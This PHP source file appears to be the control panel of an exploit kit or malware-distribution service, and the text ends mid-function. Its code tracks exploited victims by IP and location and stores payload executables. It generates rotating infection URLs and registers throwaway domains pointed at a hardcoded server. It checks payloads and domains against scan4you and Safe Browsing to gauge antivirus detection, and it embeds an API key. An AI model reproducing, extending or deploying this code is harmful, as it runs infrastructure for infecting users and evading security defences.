<?php
function check_token($token) {
	if ($_SESSION['csrf'] === $token) {
		return true;
	} else {
		return false;
	}
}

function is_post() {
	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		return true;
	} else {
		return false;
	}
}

function show_notifications() {
	if (!empty($_SESSION['notifications'])) {
        foreach($_SESSION['notifications'] as $notification) {
            echo $notification;
	    }
	}
}

function hits() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(ip) FROM hits WHERE owner = ? AND exploited = 0");
	$stmt->execute(array($_SESSION['id']));
	return $stmt->fetchColumn();
}

function rate() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM hits WHERE owner = ? AND exploited = 1");
	$stmt->execute(array($_SESSION['id']));
	$rate = $stmt->fetchColumn();
	return $rate;
}

function threads() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM flows WHERE user_id = ?");
	$stmt->execute(array($_SESSION['id']));
	return $stmt->fetchColumn();
}

function detection() {
    global $dbh;
    //$stmt = $dbh->prepare("SELECT count(*) FROM domains");
	//$stmt->execute();
	//return $stmt->fetchColumn();
    return 0;
}

function countries() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT country, count(ip) AS magnitude FROM hits WHERE owner = ?  AND exploited = 0 GROUP BY country ORDER BY magnitude DESC LIMIT 10');
	$stmt->execute(array($_SESSION['id']));
	$countries = $stmt->fetchAll();
	$i = 1;

	foreach ($countries as $country) {
		echo '						<tr>
                                      <td>'.$i.'</td>
                                      <td><img src="static/img/flags/flags_iso/48/'.strtolower($country['country']).'.png" height="20" width="20"></td>
                                      <td>'.$country['magnitude'].'</td>
                                    </tr>';
        $i++;
	}
}

function hits_grouped($exp = false) {
  global $dbh;
  $expl = ( $exp === true ) ? '1' : '0';
  $stmt = $dbh->prepare("SELECT browser, count(*) AS cc FROM hits WHERE exploited = ".$expl." AND owner = ? GROUP BY browser ORDER BY id DESC LIMIT 200");
	$stmt->execute(array($_SESSION['id']));
	$hits = $stmt->fetchAll();
	foreach ($hits as $hit) {
		$row = '
                                        <tr>
                                            <td>'.$hit['browser'].'</td>
                                            <td>'.$hit['cc'].'</td>
                                        </tr>
		';
		echo $row;
	}
  return 0;
}

function hits_field($f = '', $exp = false) {
  global $dbh;
  switch($f) {
    case 'os':
      $field = 'os';
    break;
    case 'ref':
      $field = 'referrer';
    break;
  }
  $expl = ( $exp === true ) ? '1' : '0';
  $stmt = $dbh->prepare("SELECT ".$field.", count( ip ) AS cc FROM hits WHERE exploited = ".$expl." AND os != 'Bad Bot' AND owner = ? GROUP BY ".$field." ORDER BY id DESC LIMIT 200");
	$stmt->execute(array($_SESSION['id']));
	$hits = $stmt->fetchAll();
	foreach ($hits as $hit) {
		$row = '
                                        <tr>
                                            <td>'.$hit[$field].'</td>
                                            <td>'.$hit['cc'].'</td>
                                        </tr>
		';
		echo $row;
	}
  return 0;
}

function list_hits() {
	global $dbh;
    $stmt = $dbh->prepare("SELECT ip, browser, referrer, country, city FROM hits WHERE exploited = 0 AND owner = ? ORDER BY id DESC LIMIT 200");
	$stmt->execute(array($_SESSION['id']));
	$hits = $stmt->fetchAll();
	foreach ($hits as $hit) {
		$row = '
                                        <tr>
                                            <td>'.$hit['ip'].'</td>
                                            <td>'.$hit['country'].'</td>
                                            <td>'.$hit['city'].'</td>
                                            <td>'.$hit['browser'].'</td>
                                            <td>'.$hit['referrer'].'</td>
                                        </tr>
		';
		echo $row;
	}
    return 0;
}

function list_exploited() {
	global $dbh;
    $stmt = $dbh->prepare("SELECT ip, browser, referrer, country, city FROM hits WHERE exploited = 1 AND owner = ? ORDER BY id DESC LIMIT 200");
	$stmt->execute(array($_SESSION['id']));
	$hits = $stmt->fetchAll();
	foreach ($hits as $hit) {
		$row = '
                                        <tr>
                                            <td>'.$hit['ip'].'</td>
                                            <td>'.$hit['country'].'</td>
                                            <td>'.$hit['city'].'</td>
                                            <td>'.$hit['browser'].'</td>
                                            <td>'.$hit['referrer'].'</td>
                                        </tr>
		';
		echo $row;
	}
    return 0;
}

function morris_browser_donut() {
	global $dbh;
	$stmt = $dbh->prepare("SELECT browser, count( ip ) AS magnitude FROM hits  WHERE owner = ? AND browser != 'Bad Bot' AND exploited = 0 GROUP BY browser ORDER BY magnitude DESC LIMIT 10");
	$stmt->execute(array($_SESSION['id']));
	$browsers = $stmt->fetchAll();

	foreach ($browsers as $browser) {
		echo '{ label: "'.$browser['browser'].'", value: '.$browser['magnitude'].' },';
	}
}

function subscription_expire(){
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM users WHERE id = ?');
	$stmt->execute(array($_SESSION['id']));
	$user = $stmt->fetch(PDO::FETCH_ASSOC);
	if($user['expiration'] < time()){
		die("Subscription ended");
	}
	$date = new DateTime();
	$date->setTimestamp($user['expiration']);
	$r = $date->format('d-m-Y H:i:s');
	return $r;
}

function file_exist() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM files WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function file_scan_exist($FileHash) {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM file_scans WHERE hash = ?');
	$stmt->execute(array($FileHash));
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function public_stats_token($FlowID){
	global $config;
	return hash("crc32",$config['main']['salt'].$FlowID);
}

function flow_remove_stats($FlowID){
	global $dbh;
	//chk ownership
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM flows WHERE user_id = ? AND id = ?');
	$stmt->execute(array($_SESSION['id'],$FlowID));
	$ownsT = $stmt->fetchColumn();
	if($ownsT <= 0 || empty($ownsT)){
		$errors[] = "Invalid data provided";
	}

	if(isset($errors)){
		return $errors;
	}else{
		$stmt = $dbh->prepare('DELETE FROM hits WHERE flow =  :flow');
		$stmt->bindParam(':flow', $FlowID, PDO::PARAM_STR);
		$stmt->execute();
		return true;
	}
}

function generate_thread_modals(&$refClass){
$ip = file_get_contents( getcwd().'/inc/ip.txt' );
global $dbh,$config;
   	$stmt = $dbh->prepare('SELECT * FROM flows WHERE user_id = ?');
	$stmt->execute(array($_SESSION['id']));
	while ($thread = $stmt->fetchObject()) {
		$s_data = "uid=".$_SESSION['id']."|"."fid=".$thread->id;
		$apitoken = $refClass->safe_b64encode($refClass->encrypt($config['rc4']['key'],$s_data));
		$rotator_url = getLastndPROXY();
		$u = parse_url($rotator_url->url);
		echo '<!-- #'.hash("crc32",$thread->id).' Modal -->
    <div class="modal fade" id="'.hash("crc32",$thread->id).'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                    <h4 class="modal-title" id="myModalLabel"> Flow #'.$thread->id.'</h4>
                </div>
                <div class="modal-body">
                    <form class="form-horizontal" role="form">
                        <div class="form-group">
                            <label style="white-space: nowrap;" for="" class="col-sm-2 control-label">URL Rotator:</label>
                            <div class="col-sm-10">
                                <input style="cursor: default;" onClick="this.setSelectionRange(0, this.value.length)" type="text" class="form-control" id="" placeholder="..." value="http://'.$ip.$config['main']['panel_path']."api.php?sid=".$apitoken.'" readonly="readonly">
                            </div>
                        </div>
                        <div class="form-group">
                            <label style="white-space: nowrap;" for="" class="col-sm-2 control-label">Public Stats:</label>
                            <div class="col-sm-10">
                                <input style="cursor: default;" onClick="this.setSelectionRange(0, this.value.length)" type="text" class="form-control" id="" placeholder="..." value="http://'.$ip.$config['main']['panel_path']."public.php?i=".public_stats_token($thread->id).'" readonly="readonly">
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End '.hash("crc32",$thread->id).' Modal -->';
	}
}

function getLastndPROXY(){
	global $dbh;
    $stmt = $dbh->prepare("SELECT * FROM proxy ORDER BY id DESC LIMIT 5");
    $stmt->execute();
    $proxy = $stmt->fetchAll(PDO::FETCH_ASSOC);
    if (count($proxy) > 0) {
        $proxyList = Array();
        foreach ($proxy as $k => $v) {
            $proxyList[] = $v;
        }
	$array  = $proxyList[array_rand($proxyList)];
        $object = json_decode(json_encode($array), FALSE);
        return $object;
    }
}

function generate_thread_options($FlowID){
	$d = '<div class="btn-group">
            <button type="submit" class="btn btn-success">Save</button>
            </form>
			<button type="button" data-toggle="modal" data-target="#'.hash("crc32",$FlowID).'" class="btn btn-default">Get URL</button>
			<button type="submit" onclick="document.getElementById(\'flowdel_'.$FlowID.'\').submit();" class="btn btn-danger">Delete Stats</button>
			<form role="form" method="post" action="" id="flowdel_'.$FlowID.'">
			<input type="hidden" name="action" value="flowdel"/>
			<input type="hidden" name="token" value="'.$_SESSION['csrf'].'"/>
			<input type="hidden" name="fid" value="'.$FlowID.'"/>
			</form>
		</div>';
	return $d;
}

function threads_show() {
	global $dbh;
   	$stmt = $dbh->prepare('SELECT * FROM flows WHERE user_id = ?');
	$stmt->execute(array($_SESSION['id']));
	while ($thread = $stmt->fetchObject()) {
		echo '<tr>
                    <td>'.$thread->id.'</td>
                    <td>'.generate_file_dropdown($thread->id).'</td>
                    <td width="40%">'.generate_thread_options($thread->id).'</td>
              </tr>';
	/*

	*/
	}
}

function select_flow_fileID($FlowID){
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM flows WHERE id = ?');
	$stmt->execute(array($FlowID));
	$flow = $stmt->fetch(PDO::FETCH_ASSOC);
	return $flow['file_id'];
}

function generate_del_file_dropdown(){
	global $dbh;
   	$stmt = $dbh->prepare('SELECT * FROM files WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$final = '<form role="form" method="post" action="">
	<input type="hidden" name="action" value="filedel" />
    <input type="hidden" name="token" value="'.$_SESSION['csrf'].'" />
	<div class="form-group">
    <select name="file" class="form-control input-sm">';
	while ($file = $stmt->fetchObject()) {
		$final .= '<option value="'.$file->hash.'">'.$file->name.'</option>';

	}
	$final .= '</select><br>
						 <button type="submit" class="btn btn-danger">Delete</button></div></form>';
	return $final;
}

function delete_file($hash){
	global $dbh;
	$stmt = $dbh->prepare('DELETE FROM files WHERE hash = ?');
	$stmt->execute(array($hash));
}

function generate_file_dropdown($FlowID){
	global $dbh;
   	$stmt = $dbh->prepare('SELECT * FROM files WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$current_file = select_flow_fileID($FlowID);
	$final = '<form role="form" method="post" action="">
	<input type="hidden" name="action" value="fileupdate" />
    <input type="hidden" name="token" value="'.$_SESSION['csrf'].'" />
	<input type="hidden" name="fid" value="'.$FlowID.'" />
	<div class="form-group">
                                    <select name="file" class="form-control input-sm">';
	while ($file = $stmt->fetchObject()) {
		$final .= '<option value="'.$file->hash.'" '.($current_file == $file->id ? 'selected="selected"' : '').'>'.$file->name.'</option>';

	}
	$final .= '</select>
						</div>';
	return $final;
}

function check_s4y($file,$type='file',$options=array()){
	global $config;
    $options['pooling'] = 1;
    $options['id'] = $config['scan4you']['id'];
    $options['token'] = $config['scan4you']['token'];
    $options['action'] = $type;
    $url='http://scan4you.net/remote.php';

    if (in_array($type,array('file','run')) && (!file_exists($file))) die ("$file dosn`t exist.\n");

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, $options['debug']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
//    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // Try this if you have problem with certificates
//    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Try this if you have problem with certificates
    if (!in_array($type,array('file','run'))) $options[$type]=$file;
    else {
        if (class_exists('CURLFile')){
            $cfile = new CURLFile($file,'application/octet-stream',$type);
            $options['uppload']=$cfile;
        } else {
            $options['uppload']='@'.$file;
        }
    }
    if ($options['debug']) echo "DEBUG: send request to $url, fields:".print_r($options,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $options);
    $response = curl_exec($ch);
    if ($response === false || curl_errno($ch))       return 'ERROR: Error connecting to server - '.curl_error($ch);
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) return 'ERROR: Error from server - '.curl_getinfo($ch, CURLINFO_HTTP_CODE);

    list($s,$p)  = explode(':',$response);
    if ($s == 'POOL'){
    $options['pool_id'] = trim($p);
    $options['action'] = 'pool';
    unset($options['uppload']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $options);
    $response = '';
    $t = time() + 1800;
    do {
        sleep(5);
        if ($options['debug']) echo "DEBUG: send pool request to $url, fields:".print_r($options,1);
        $response = curl_exec($ch);
    }while (!$response || time() > $t);
    if (!$response)       return 'ERROR: Error pooling job';
    }
    curl_close($ch);
    return $response;
}

function generate_scan_dropdown(){
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM files WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$final = '<div class="form-group"><select id="scanfile" class="form-control input-sm">';
	while ($file = $stmt->fetchObject()) {
		$final .= '<option value="'.$file->hash.'">'.$file->name.'</option>';

	}
	$final .= '</select></div>';
	return $final;
}

function notification_box($type,$msg){
	return '<div class="alert alert-'.$type.' alert-dismissable">
                <button type="button" class="close" data-dismiss="alert" aria-hidden="true">?</button>
                '.$msg.'
			</div>';
}

function ffile_result_parser($type,$result){

	if($type == "fileupdate"){
		if($result === true){
			return notification_box("success","Flow successfully updated");
		}else{
			$r = null;
			foreach($result as $e){
			$r .= notification_box("danger","There was an error:".$e);
			}
			return $r;
		}
	}elseif($type == "flowdel"){
		if($result === true){
			return notification_box("success","Flow stats successfully deleted");
		}else{
			return notification_box("danger","Invalid data provided");
		}
	}

}

function flow_file_change($FlowID,$FileHash){
	global $dbh;
	$errors = array();
	if(!isset($FlowID) || !isset($FileHash)){
		$errors[] = "Invalid request";
	}
	//chk file hash
	if(file_same($FileHash) !== true){
		$errors[] = "Invalid file selected";
	}
	//chk user owns file&thread
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM files WHERE owner = ? AND hash = ?');
	$stmt->execute(array($_SESSION['id'],$FileHash));
	$ownsF = $stmt->fetchColumn();
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM flows WHERE user_id = ? AND id = ?');
	$stmt->execute(array($_SESSION['id'],$FlowID));
	$ownsT = $stmt->fetchColumn();
	if($ownsF <= 0 || $ownsT <= 0){
		$errors[] = "Invalid data provided";
	}

	if($errors){
		return $errors;
	}else{
		$stmt = $dbh->prepare('SELECT * FROM files WHERE hash = ?');
		$stmt->execute(array($FileHash));
		$file = $stmt->fetch(PDO::FETCH_ASSOC);
		$stmt = $dbh->prepare("UPDATE flows SET file_id = ? WHERE id = ?");
		$stmt->execute(array($file['id'], $FlowID));
		return true;
	}
}

function file_details($id ,$type = "id"){
	global $dbh;
	if($type == "id"){
		$stmt = $dbh->prepare('SELECT * FROM files WHERE id = ?');
		$stmt->execute(array($id));
		$file = $stmt->fetch(PDO::FETCH_ASSOC);
		return $file;
	}elseif($type == "hash"){
		$stmt = $dbh->prepare('SELECT * FROM files WHERE hash = ?');
		$stmt->execute(array($id));
		$file = $stmt->fetch(PDO::FETCH_ASSOC);
		return $file;
	}
}

function file_show() {
	global $dbh;
   	$stmt = $dbh->prepare('SELECT name, hash, timestamp, url, description, char_length(file) as dim FROM files WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	while ($file = $stmt->fetchObject()) {
		echo '					<tr>
                                    <td>'.$file->name.'</td>
                                    <td>'.$file->hash.'</td>
                                    <td>'.round($file->dim/1024).' Kb </td>
                                    <td>'.date('F j, Y, g:i a', $file->timestamp).'</td>
                                    <td>'.(empty($file->description) ? 'Empty' : $file->description).' <br>URL: <i>'.$file->url.'</i></td>
									<td>'.chk_scan($file->hash).'</td>
                                </tr>';
	}
}

function chk_scan($FileHash){
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM file_scans WHERE hash = ?');
	$stmt->execute(array($FileHash));
	$file = $stmt->fetch(PDO::FETCH_ASSOC);
	if(!empty($file)){
		return $file['rate'];
	}else{
		return "N/A";
	}
}

function file_same($hash){
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM files WHERE hash = ? AND owner = ?');
	$stmt->execute(array($hash, $_SESSION['id']));
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function file_url($desc, $url) {
	global $dbh;
	global $config;
	$extract = explode("/", $url);
	$file = end($extract);

 	$filetype = pathinfo($file, PATHINFO_EXTENSION);
    if (strlen($desc) > 254) {
    	$errors[] = 'Description is too long.';
    }
    if (!in_array($filetype, $config['files']['ext'])) {
    	$errors[] = 'File type not allowed.';
    }
    if (empty($errors)) {
		$string = file_get_contents($url);
		if(trim($string)!=="") {
			$hash = sha1($string);
			$h = getHash($hash)['hash'];
			if($h=="") {
				$stmt = $dbh->prepare('INSERT INTO files (owner, name, file, hash, description, timestamp, url) VALUES (?, ?, ?, ?, ?, ?, ?)');
				$stmt->execute(array($_SESSION['id'], $file, $string, $hash, $desc, time(), $url));
			}
		}
    }
}

function getHash($FileHash) {
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM files WHERE hash = ?');
	$stmt->execute(array($FileHash));
	$file = $stmt->fetch(PDO::FETCH_ASSOC);
	return $file;
}

function file_upload($desc, $file) {
	global $dbh;
	global $config;

 	$filetype = pathinfo($file['file']['name'], PATHINFO_EXTENSION);
    $filename = htmlentities($file['file']['name']);
    $hash = sha1_file($file['file']['tmp_name']);
    $desc = htmlentities($desc);

    if (strlen($desc) > 254) {
    	$errors[] = 'Description is too long.';
    }

    if (!in_array($filetype, $config['files']['ext'])) {
    	$errors[] = 'File type not allowed.';
    }

    if (empty($errors)) {
    	if (file_same($hash) == true) {
    		$stmt = $dbh->prepare('DELETE FROM files WHERE hash = ? AND owner = ?');
			$stmt->execute(array($hash, $_SESSION['id']));

    		#$stmt = $dbh->prepare('DELETE FROM scans WHERE owner = ? AND type = ?');
			#$stmt->execute(array($_SESSION['id'], 'file'));

    		$stmt = $dbh->prepare('INSERT INTO files (owner, name, file, hash, description, timestamp) VALUES (?, ?, ?, ?, ?, ?)');
			$stmt->execute(array($_SESSION['id'], $filename, file_get_contents($file['file']['tmp_name']), $hash, $desc, time()));
    	} else {
   			$stmt = $dbh->prepare('INSERT INTO files (owner, name, file, hash, description, timestamp) VALUES (?, ?, ?, ?, ?, ?)');
			$stmt->execute(array($_SESSION['id'], $filename, file_get_contents($file['file']['tmp_name']), $hash, $desc, time()));
    	}

    }
}

function scan_show() {
	global $dbh;
	if (scan_exist()) {
		$stmt = $dbh->prepare('SELECT * FROM scans WHERE owner = ? AND type = ?');
		$stmt->execute(array($_SESSION['id'], 'file'));
		$scan = $stmt->fetch();

		return $scan['rate'];
	} else {
		return '0/0';
	}
}


function rate_percentage() {
	global $dbh;
	return round((100*rate())/hits(), 2);
}

function file_scan($FileHash) {
	global $dbh;
	global $config;
	$stmt = $dbh->prepare('SELECT * FROM files WHERE hash = ?');
	$stmt->execute(array($FileHash));
	$file = $stmt->fetch();
	if(!empty($file)){
		$tmpfile = 'tmp/'.bin2hex(openssl_random_pseudo_bytes(8)).'.exe';
		file_put_contents($tmpfile, $file['file']);
		$options=array();
		$options['debug']=0;
		$options['link'] = 0;
		$options['format'] = 'json';
		$report = check_s4y($tmpfile,"file",$options);
		$rate = parseScan($report);
		unlink($tmpfile);
		if (file_scan_exist($FileHash)) {
			$stmt = $dbh->prepare("UPDATE file_scans SET rate = ?,result = ? WHERE id = ?");
			$stmt->execute(array($rate,$report, $file['id']));
			return parseReport($report);
		} else {
			$stmt = $dbh->prepare('INSERT INTO file_scans (file, owner, name, hash, rate, result) VALUES (?, ?, ?, ?, ?, ?)');
			$stmt->execute(array($file['id'], $_SESSION['id'], $file['name'], $file['hash'], $rate, $report));
			return parseReport($report);
		}
	}else{

	}
}

function parseReport($report){
	$r = '<div class="table-responsive"><table class="table">
                              <thead>
                                <tr>
                                  <th>AV</th>
                                  <th>Detection</th>
                                </tr>
                              </thead>
                              <tbody><tr class="default">
						<td>Rate:</td>
						<td>'.parseScan($report).'</td>
					</tr>';
	$data = explode("\n",$report);
	unset($data[35]);
	foreach($data as $v){
		$p = explode(":",$v);
		if($p[1] != "OK"){
			$r .= '<tr class="danger">
						<td>'.$p[0].'</td>
						<td>'.str_replace($p[0],"",implode(" ",$p)).'</td>
					</tr>';
		}else{
			$r .= '<tr class="success">
						<td>'.$p[0].'</td>
						<td>'.$p[1].'</td>
					</tr>';
		}
	}
	$r .= '</tbody>
                            </table></div>';
	return $r;
}

function parseScan($data){
	$counter = 0;
	$dd = explode("\n",$data);
	unset($dd[35]);
	foreach($dd as $v){
		$p = explode(":",$v);
		if($p[1] != "OK"){
		$counter = $counter + 1;
		}
	}
	return $counter."/".count($dd);
}


function domain_check_safebrowsing($domain) {
	$safebrowsing = "https://sb-ssl.google.com/safebrowsing/api/lookup?client=api&apikey=ABQIAAAAebbr-o7R7M_9g_NBgR8_jRTSjqJ1VY9Sq54WTTHRjlBGrv8n-g&appver=1.0&pver=3.0&url=".$domain;
	$safebrowsing = file_get_contents($safebrowsing);

    if (
preg_match("/phishing/", $safebrowsing ) ||
preg_match("/malware/", $safebrowsing ) ||
preg_match("/phishing,malware/", $safebrowsing ) ||
preg_match("/phishing,unwanted/", $safebrowsing ) ||
preg_match("/malware,unwanted/", $safebrowsing ) ||
preg_match("/phishing,malware,unwanted/", $safebrowsing )
){
        return '<font color="red">Detected</font>';
    } else {
        return '<font color="green">Clean</font>';
	}
}











function domains_server_exist() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM domains WHERE owner = 0');
	$stmt->execute();
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function domains_server_show() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM domains WHERE owner = 0');
	$stmt->execute();
	$domains = $stmt->fetchAll();
	foreach ($domains as $domain) {
		echo '						<tr>
                                      <td>'.$domain['domain'].'</td>
                                      <td>'.domain_check_safebrowsing($domain['domain']).'</td>
                                      <td><input type="text" value="http://'.$domain['domain'].'/?'.$_SESSION['uid'].'" readonly></td>
                                      <td><input type="text" value="http://'.$domain['domain'].dirname($_SERVER['PHP_SELF']).'/public.php?i='.$_SESSION['uid'].'" readonly></td>
                                    </tr>';
	}
}

function domains_user_exist() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM domains WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function domains_user_show() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM domains WHERE owner = ?');
	$stmt->execute(array($_SESSION['id']));
	$domains = $stmt->fetchAll();
	foreach ($domains as $domain) {
		echo '						<tr>
                                      <td>'.$domain['domain'].'.co.vu</td>
                                      <td>'.domain_check_safebrowsing($domain['domain']).'</td>
                                      <td><input type="text" value="http://'.$domain['domain'].'.co.vu'.'/?'.base64_encode($_SESSION['uid']).'" readonly></td>
                                      <td><input type="text" value="http://'.$domain['domain'].'.co.vu'.dirname($_SERVER['PHP_SELF']).'/public.php?i='.$_SESSION['uid'].'" readonly></td>
                                    </tr>';
	}
}

function domains_user_add($domain) {
	global $dbh;
    global $config;

	if (empty($domain) || strlen($domain) > 58 || strlen($domain) < 3 || !ctype_alnum($domain)) {
		$errors[] = 'Domain must be alphanumeric and longer than 3 chars.';
	}

    //$ip = file_get_contents('http://icanhazip.com');
    $ip = '108.61.188.176';
    $ch = curl_init();
    $authpost = array(
        'emailTxt'        => $config['codotvu']['user'],
        'passwordTxt'     => $config['codotvu']['pass']
    );
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_COOKIEJAR, $config['codotvu']['cookie']);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $config['codotvu']['url'].'/auth/login');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $authpost);
    $authresult = json_decode(curl_exec($ch), true);

    if ($authresult['status'] != true) {
    	$errors[] = 'Invalid username or password for codotvu.com.';
    }

    $addpost = array(
        'domain'    => $domain
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_COOKIEJAR, $config['codotvu']['cookie']);
    curl_setopt($ch,CURLOPT_COOKIEFILE, $config['codotvu']['cookie']);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $config['codotvu']['url'].'/domainapi/registerfree');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $addpost);
    $addresult = json_decode(curl_exec($ch), true);

    if ($addresult['status'] != true) {
    	$errors[] = 'Ivalid domain. Is it already registered?';
    }

    $confpost = array(
        'dnsContentTxt' => $ip,
        'dnsType'       => 'A',
        'domain'        => $domain
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_COOKIEJAR, $config['codotvu']['cookie']);
    curl_setopt($ch,CURLOPT_COOKIEFILE, $config['codotvu']['cookie']);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $config['codotvu']['url'].'/dns/dnsrecords/createorupdate');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $confpost);
    $confresult = json_decode(curl_exec($ch), true);

    if ($confresult['status'] != true) {
        $errors[] = 'There was an error setting DNS for the new domain. However it has been registered.';
    }

    if (empty($errors)) {
    	$stmt = $dbh->prepare('INSERT INTO domains (owner, domain) VALUES (?, ?)');
    	$stmt->execute(array($_SESSION['id'], $domain));
    	return true;
    } else {
    	return $errors;
    }
}


function domains_user_remove($domain) {
	global $dbh;
    global $config;
    $stmt = $dbh->prepare('SELECT count(*) FROM domains WHERE domain = ? AND owner = ?');
    $stmt->execute(array($domain, $_SESSION['id']));
    $exist = $stmt->fetchColumn();

    if ($exist > 0) {
    	$delpost = array(
            'domain'        => $domain
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch,CURLOPT_COOKIEJAR, $config['codotvu']['cookie']);
        curl_setopt($ch,CURLOPT_COOKIEFILE, $config['codotvu']['cookie']);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $config['codotvu']['url'].'/domainapi/delete');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $delpost);
        $result = json_decode(curl_exec($ch), true);
    } else {
    	$errors[] = 'Domain not found.';
    }

    if (empty($errors)) {
    	$stmt = $dbh->prepare('DELETE FROM domains WHERE domain = ? AND owner = ?');
    	$stmt->execute(array($domain, $_SESSION['id']));
    	return true;
    } else {
    	return $errors;
    }
}

function domains_scan_exist() {
    global $dbh;
    $stmt = $dbh->prepare('SELECT COUNT(*) FROM scans WHERE owner = ? AND type = ?');
    $stmt->execute(array($_SESSION['id'], 'domain'));
    $exist = $stmt->fetchColumn();
    if ($exist > 0) {
        return true;
    } else {
        return false;
    }
}

function domains_user_scan($domain) {
    global $dbh;
    global $config;

    $post = array(
        'id'        => $config['scan4you']['id'],
        'token'     => $config['scan4you']['token'],
        'action'    => 'domain',
        'domain'    => $domain,
        'frmt'      => $config['scan4you']['format'],
        'link'      => 1
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $config['scan4you']['url']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $result = curl_exec($ch);
    $result = json_decode($result, true);
    $report   = substr($result['LINK'], 4);
    unset($result['LINK']);
    $total  = count($result);
    $ok     = array_count_values($result);
    $detection = $total - $ok['OK'];
    $rate = $detection.'/'.$total;

    if (scan_exist()) {
        $stmt = $dbh->prepare('DELETE FROM scans WHERE owner = ? AND type = ?');
        $stmt->execute(array($_SESSION['id'], 'domain'));

        $stmt = $dbh->prepare('INSERT INTO scans (type, domain, owner, rate, result) VALUES (?, ?, ?, ?, ?)');
        $stmt->execute(array('domain', htmlentities($domain), $_SESSION['id'], $rate, $report));
    } else {
        $stmt = $dbh->prepare('INSERT INTO scans (type, domain, owner, rate, result) VALUES (?, ?, ?, ?, ?)');
        $stmt->execute(array('domain', htmlentities($domain), $_SESSION['id'], $rate, $report));
    }

}

function domains_scan_show() {
    global $dbh;
    if (scan_exist()) {
        $stmt = $dbh->prepare('SELECT * FROM scans WHERE owner = ? AND type = ?');
        $stmt->execute(array($_SESSION['id'], 'domain'));
        $scan = $stmt->fetch();

        echo '                      <tr>
                                      <td>'.$scan['domain'].'</td>
                                      <td>'.$scan['result'].'</td>
                                      <td>'.date('F j, Y, g:i a', $scan['timestamp']).'</td>
